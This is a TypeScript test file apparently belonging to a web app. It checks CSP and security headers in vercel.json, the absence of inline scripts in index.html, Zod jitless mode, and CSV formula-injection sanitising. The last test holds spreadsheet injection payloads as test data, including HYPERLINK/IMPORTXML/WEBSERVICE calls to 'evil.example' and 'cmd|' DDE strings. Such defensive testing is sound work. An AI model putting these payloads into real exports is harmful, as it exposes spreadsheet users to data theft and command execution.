import fs from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { z } from 'zod';
import { sanitizeCsvFormulaCell, serializeCsvDocument } from '@/lib/utilities/csvExport';
import { ensureCspSafeZodConfig } from '@/lib/validation/zodConfig';

interface VercelHeaderItem {
  readonly key: string;
  readonly value: string;
}

interface VercelHeaderRule {
  readonly source: string;
  readonly headers: readonly VercelHeaderItem[];
}

interface VercelConfigFile {
  readonly rewrites?: readonly { readonly source: string; readonly destination: string }[];
  readonly headers?: readonly VercelHeaderRule[];
}

function parseCspDirectives(cspValue: string): Map<string, string[]> {
  const directives = new Map<string, string[]>();
  for (const rawPart of cspValue.split(';')) {
    const trimmed = rawPart.trim();
    if (!trimmed) {
      continue;
    }
    const tokens = trimmed.split(/\s+/);
    const name = tokens[0];
    if (name) {
      directives.set(name, tokens.slice(1));
    }
  }
  return directives;
}

describe('Production HTTP Security Headers, CSP & Zod jitless mode (P9-AC06, P9-AC07, P9-AC10)', () => {
  it('enforces strict CSP without unsafe-eval or inline scripts in vercel.json alongside HSTS and baseline headers', () => {
    const vercelJsonPath = path.resolve(process.cwd(), 'vercel.json');
    const config = JSON.parse(fs.readFileSync(vercelJsonPath, 'utf8')) as VercelConfigFile;

    const globalRule = config.headers?.find((rule) => rule.source === '/(.*)');
    expect(globalRule).toBeDefined();

    const headerMap = new Map(
      (globalRule?.headers ?? []).map((entry) => [entry.key.toLowerCase(), entry.value]),
    );

    expect(headerMap.get('x-content-type-options')).toBe('nosniff');
    expect(headerMap.get('x-frame-options')).toBe('DENY');
    expect(headerMap.get('referrer-policy')).toBe('strict-origin-when-cross-origin');
    expect(headerMap.get('permissions-policy')).toContain('camera=()');
    expect(headerMap.get('strict-transport-security')).toBe(
      'max-age=63072000; includeSubDomains; preload',
    );

    const csp = headerMap.get('content-security-policy');
    expect(csp).toBeDefined();

    const directives = parseCspDirectives(csp ?? '');
    expect(directives.get('default-src')).toEqual(["'self'"]);
    expect(directives.get('script-src')).toEqual(["'self'"]);
    expect(directives.get('script-src')).not.toContain("'unsafe-eval'");
    expect(directives.get('script-src')).not.toContain("'unsafe-inline'");
    expect(directives.get('style-src')).toEqual(["'self'", "'unsafe-inline'"]);
    expect(directives.get('img-src')).toEqual([
      "'self'",
      'data:',
      'blob:',
      'https://*.supabase.co',
    ]);
    expect(directives.get('font-src')).toEqual(["'self'", 'data:']);
    expect(directives.get('connect-src')).toEqual([
      "'self'",
      'https://*.supabase.co',
      'wss://*.supabase.co',
    ]);
    expect(directives.get('object-src')).toEqual(["'none'"]);
    expect(directives.get('base-uri')).toEqual(["'self'"]);
    expect(directives.get('form-action')).toEqual(["'self'"]);
    expect(directives.get('frame-ancestors')).toEqual(["'none'"]);
  });

  it('keeps index.html free of inline scripts or third-party font/CDN origins so script-src self never breaks', () => {
    const indexHtml = fs.readFileSync(path.resolve(process.cwd(), 'index.html'), 'utf8');

    // Only external module `<script type="module" src="/src/main.tsx"></script>` is allowed
    const scriptTags = [...indexHtml.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)];
    expect(scriptTags.length).toBe(1);
    for (const [, attrs, inner] of scriptTags) {
      expect(attrs).toContain('src=');
      expect((inner ?? '').trim()).toBe('');
    }

    expect(indexHtml).not.toContain('fonts.googleapis.com');
    expect(indexHtml).not.toContain('fonts.gstatic.com');
  });

  it('configures Zod v4 z.config().jitless = true so schema parsing never invokes new Function()', () => {
    ensureCspSafeZodConfig();
    expect(z.config().jitless).toBe(true);

    const sampleSchema = z.strictObject({
      slug: z.string().min(3),
      maxAttendees: z.number().int().min(1),
    });
    expect(sampleSchema.parse({ slug: 'clara-and-mateo', maxAttendees: 4 })).toEqual({
      slug: 'clara-and-mateo',
      maxAttendees: 4,
    });
  });

  it('neutralizes OWASP spreadsheet formula-injection payloads across all dangerous prefixes', () => {
    const payloads = [
      '=HYPERLINK("https://evil.example","Click")',
      "+cmd|' /C calc'!A0",
      "-2+3+cmd|' /C calc'!A0",
      "@SUM(1+1)*cmd|' /C calc'!A0",
      '\t=IMPORTXML("https://evil.example","//a")',
      '\r=1+1',
      '   =WEBSERVICE("https://evil.example")',
    ];

    for (const payload of payloads) {
      const sanitized = sanitizeCsvFormulaCell(payload);
      expect(sanitized.startsWith("'")).toBe(true);
    }

    const csv = serializeCsvDocument({
      headers: ['Guest', 'Note'],
      rows: [['Lucia', '=HYPERLINK("https://evil.example","steal")']],
    });
    expect(csv.startsWith('\uFEFF')).toBe(true);
    expect(csv).toContain('"\'=HYPERLINK(""https://evil.example"",""steal"")"');
  });
});
